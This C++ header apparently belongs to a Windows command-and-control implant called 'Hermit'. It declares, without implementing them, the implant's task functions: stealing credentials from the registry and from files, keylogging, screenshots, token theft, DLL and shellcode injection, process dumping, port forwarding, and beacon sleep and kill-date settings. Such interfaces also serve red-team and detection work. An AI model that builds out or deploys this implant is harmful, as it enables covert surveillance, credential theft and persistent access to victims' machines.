#ifndef HERMIT_CORE_TASK_HPP
#define HERMIT_CORE_TASK_HPP

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winhttp.h>
#include <winreg.h>
#include <winternl.h>
#include <dbghelp.h>
#include <gdiplus.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <shlwapi.h>
#include <strsafe.h>
#include <synchapi.h>
#include <tlhelp32.h>
#include <chrono>
#include <map>
#include <string>
#include <vector>

#include "core/macros.hpp"
#include "core/state.hpp"
#include "core/stdout.hpp"
#include "core/system.hpp"
#include "core/technique.hpp"
#include "core/utils.hpp"

namespace Task
{
    namespace Helper::Creds
    {
        std::map<std::wstring, std::vector<std::wstring>> StealCredsFromRegistryHives(
            const std::wstring& wUserSID
        );
        std::map<std::wstring, std::vector<std::wstring>> StealCredsFromFiles(
            const std::wstring& wUserName,
            const std::wstring& wUserSID
        );
    }

    namespace Helper::KeyLog
    {
        typedef struct _MYHOOKDATA
        {
            int nType;
            HOOKPROC hkprc;
            HHOOK hhook;
        } MYHOOKDATA;
        VOID SaveKey(DWORD dwKey);
        LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lPram);
    }

    namespace Helper::Reg
    {
        HKEY GetRegRootKey(const std::wstring& wRootKey);
        std::vector<std::wstring> ListRegSubKeys(
            HKEY hRootKey,
            const std::wstring& wSubKey,
            DWORD dwOptions,
            BOOL bRecurse
        );
    }

    namespace Helper::Screenshot
    {
        BOOL InitInstance(HINSTANCE hInstance, INT nCmdShow);
        // INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
        INT GetEncoderClsid(const WCHAR* format, CLSID* pClsid);
        BOOL BmpToPng();
        BOOL DeleteBmp();
        int CaptureAnImage(HWND hWnd);
        LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
        ATOM MyRegisterClass(HINSTANCE hInstance);
    }

    namespace Helper::Token
    {
        HANDLE GetTokenByPid(DWORD dwPid);
        BOOL CreateProcessWithStolenToken(HANDLE hToken, LPCWSTR appName);
    }

    std::wstring Cat(const std::wstring& wFilePath);
    std::wstring Cd(const std::wstring& wDestDir);
    std::wstring Connect(State::PSTATE pState, const std::wstring& wListenerURL);
    std::wstring Cp(const std::wstring& wSrc, const std::wstring& wDest);
    std::wstring CredsSteal();
    std::wstring Dll(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc);
    std::wstring Download(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
    std::wstring EnvLs();
    std::wstring Execute(const std::wstring& wCmd);
    std::wstring Groups();
    std::wstring History();
    std::wstring Ip();
    std::wstring JitterSet(State::PSTATE pState, const std::wstring& wJitter);
    std::wstring KeyLog(const std::wstring& wLogTime);
    std::wstring Kill(State::PSTATE pState);
    std::wstring KillDateSet(State::PSTATE pState, const std::wstring& wKillDate);
    std::wstring Ls(const std::wstring& wDir);
    std::wstring Migrate(const std::wstring& wPid);
    std::wstring Mkdir(const std::wstring& wDir);
    std::wstring Mv(const std::wstring& wSrc, const std::wstring& wDest);
    std::wstring Net();
    std::wstring Procdump(const std::wstring& wPid);
    std::wstring Ps();
    std::wstring PsKill(const std::wstring& wPid);
    std::wstring Pwd();
    std::wstring RegSubKeys(const std::wstring& wRootKey, const std::wstring& wSubKey, BOOL bRecurse);
    std::wstring RegValues(const std::wstring& wRootKey, const std::wstring& wSubKey, BOOL bRecurse);
    std::wstring Rm(const std::wstring& wFile);
    std::wstring Rmdir(const std::wstring& wDir);
    std::wstring RportfwdAdd(State::PSTATE pState, const std::wstring& wLIP, const std::wstring& wLPort, const std::wstring& wFwdIP, const std::wstring& wFwdPort);
    std::wstring RportfwdLs(State::PSTATE pState);
    std::wstring RportfwdRm(const std::wstring& wIP, const std::wstring& wPort);
    std::wstring RunAs(const std::wstring& wUser, const std::wstring& wPassword, const std::wstring& wCmd);
    std::wstring Screenshot(State::PSTATE pState);
    std::wstring Shellcode(State::PSTATE pState, const std::wstring& wPid, const std::wstring& wSrc);
    std::wstring SleepSet(State::PSTATE pState, const std::wstring& wSleep);
    std::wstring TokenRevert();
    std::wstring TokenSteal(const std::wstring& wPid, const std::wstring& wProcName);
    std::wstring Upload(State::PSTATE pState, const std::wstring& wSrc, const std::wstring& wDest);
    std::wstring Users();
    std::wstring Whoami();
    std::wstring WhoamiPriv();
}

#endif // HERMIT_CORE_TASK_HPP